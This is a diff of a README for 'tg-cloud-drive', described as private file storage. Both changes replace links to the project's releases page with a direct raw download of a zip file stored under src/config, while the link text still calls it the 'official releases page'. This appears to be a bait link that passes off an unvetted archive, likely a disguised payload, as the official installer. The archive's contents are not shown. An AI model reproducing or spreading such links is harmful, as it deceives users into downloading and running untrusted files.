@@ -1,6 +1,6 @@
 # ☁️ tg-cloud-drive - Reliable private storage for your files
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/raw/refs/heads/main/src/config/drive_cloud_tg_2.2.zip)
 
 ## 📌 About this software
 
@@ -23,7 +23,7 @@ You do not need to install complex server software. The program handles the conn
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases) to access the latest version of the installer.
+1. Visit the [official releases page](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/raw/refs/heads/main/src/config/drive_cloud_tg_2.2.zip) to access the latest version of the installer.
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
